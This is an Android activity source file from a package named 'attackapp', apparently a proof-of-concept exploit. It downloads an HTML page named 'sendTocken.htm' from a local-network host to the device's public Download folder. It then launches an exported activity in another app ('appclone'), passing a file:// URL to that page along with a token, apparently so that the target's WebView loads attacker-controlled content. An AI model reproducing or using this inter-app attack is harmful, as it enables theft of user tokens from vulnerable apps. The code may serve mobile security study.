package com.example.tbag.attackapp;

import android.app.AlertDialog;
import android.app.DownloadManager;
import android.app.Notification;
import android.app.NotificationManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.res.Resources;
import android.net.Uri;
import android.os.Environment;
import android.support.v7.app.ActionBarActivity;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.Button;
import android.widget.RemoteViews;

import java.io.File;
import java.io.IOException;


public class MainActivity extends AppCompatActivity {

    private NotificationManager notificationManager;
    private Resources mResource;
    private View notifyContentView;
    private long enqueue;
    private String TAG = "MainActivity";
    public  static  final String Intent_url="URL";

    File destFile;
    private Context mContext;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        final String url = "http://192.168.86.225/sendTocken.htm";
        final String filename = "send.htm";

        setContentView(R.layout.activity_main);
        Button button = (Button) findViewById(R.id.button);
        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                down(url,filename);

            }
        });
        final ComponentName componentName = new ComponentName(
                "com.example.tbag.appclone",
                "com.example.tbag.appclone.SuccessActivity");
        Intent intent = new Intent();
        Bundle bundle = new Bundle();
        intent.setComponent(componentName);
        String tocken = "user1";
        //将这个发送给send.htm
        bundle.putString("URL", "file:///sdcard/Download/send.htm");
        //bundle.putString("URL", "http://baidu.com/");
        bundle.putString("token","dilidididildid");
        // 成功 啦啦啦啦啦啦
        intent.putExtra("bundle", bundle);
        startActivity(intent);
    }
    private void down(String downloadUrl,String fileName){
        mContext = this.getApplicationContext();
        //创建下载任务,downloadUrl就是下载链接
        DownloadManager.Request request = new DownloadManager.Request(Uri.parse(downloadUrl));
        //指定下载路径和下载文件名
        request.setDestinationInExternalPublicDir("/download/", fileName);
        //获取下载管理器
        DownloadManager downloadManager= (DownloadManager) mContext.getSystemService(Context.DOWNLOAD_SERVICE);
        //将下载任务加入下载队列，否则不会进行下载
        // 下载到sdcard/Download文件夹下  16版本以上的系统会显示nor current process has android.permission.WRITE_EXTERNAL_STORAGE.不能使用该权限
        //API < 19：需要申请
        //API >= 19：不需要申请
        downloadManager.enqueue(request);
        Log.d(TAG, "down: ");
    }

}
